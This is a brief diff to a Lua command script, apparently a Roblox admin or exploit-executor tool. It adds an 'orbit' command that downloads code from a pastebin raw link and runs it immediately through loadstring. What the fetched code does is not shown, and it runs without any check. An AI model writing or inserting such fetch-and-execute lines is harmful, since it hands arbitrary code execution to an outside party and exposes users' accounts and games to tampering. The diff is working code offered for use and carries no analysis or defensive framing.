@@ -155,6 +155,10 @@ local commands do
 		end
 	end}
 
+	commands.orbit = {function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/aZjaAr6F"))()
+	end}
+
 	commands.chat = {function(speaker, args)
 		chat(table.concat(args, " "))
 	end}
